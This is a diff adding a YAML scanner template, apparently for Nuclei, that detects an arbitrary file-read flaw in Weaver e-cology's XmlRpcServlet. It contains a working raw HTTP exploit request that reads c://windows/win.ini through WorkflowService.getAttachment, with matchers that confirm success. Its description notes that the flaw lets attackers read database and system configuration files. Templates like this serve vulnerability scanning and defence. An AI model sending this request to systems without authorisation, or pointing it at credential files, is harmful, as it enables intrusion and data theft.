@@ -1,0 +1,34 @@
+
+id: weaver-ecology-XmlRpcServlet-FileRead
+
+info:
+  name: weaver-ecology-XmlRpcServlet-FileRead
+  author: kyo
+  severity: critical
+  description:   泛微e-cology XmlRpcServlet接口处存在任意文件读取漏洞，攻击者可通过该漏洞读取系统重要文件（如数据库配置文件、系统配置文件）等获取敏感信息，从而进一步攻击。
+  reference:
+    - https://trganda.github.io/notes/security/vulnerabilities/ecology/%E6%B3%9B%E5%BE%AE-Ecology-XmlRpcServlet-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E
+  tags: weaver,ecology,fileread
+
+http:
+  - raw:
+      - |-
+        POST /weaver/org.apache.xmlrpc.webserver.XmlRpcServlet HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_8_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2866.71 Safari/537.36
+        Accept: */*
+        Content-Type: application/x-www-form-urlencoded
+        Connection: close
+        Content-Length: 200
+
+        <?xml version="1.0" encoding="UTF-8"?><methodCall><methodName>WorkflowService.getAttachment</methodName><params><param><value><string>c://windows/win.ini</string></value></param></params></methodCall>
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - <base64>OyBmb3Ig
+      - type: status
+        status:
+          - 200
